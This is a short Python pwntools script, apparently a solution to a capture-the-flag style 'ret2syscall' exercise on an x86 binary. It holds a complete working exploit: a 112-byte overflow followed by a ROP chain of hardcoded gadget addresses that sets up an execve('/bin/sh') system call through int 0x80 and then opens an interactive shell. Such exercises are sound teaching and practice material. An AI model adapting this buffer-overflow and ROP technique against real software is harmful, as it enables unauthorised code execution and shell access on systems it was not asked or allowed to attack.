#Made by fly_autumn
#x86 ret2syscall
from pwn import *
p = process("./ret2syscall")

offset = 112
pop_eax_addr = 0x80bb196 
pop_edx_ecx_ebx_addr = 0x806eb90 
bin_sh_addr = 0x80be408
int_0x80_addr = 0x8049421
payload = offset*b"\x00" + p32(pop_eax_addr) + p32(0xb) + p32(pop_edx_ecx_ebx_addr) + p32(0) + p32(0) + p32(bin_sh_addr) + p32(int_0x80_addr)
p.sendline(payload)

p.interactive()
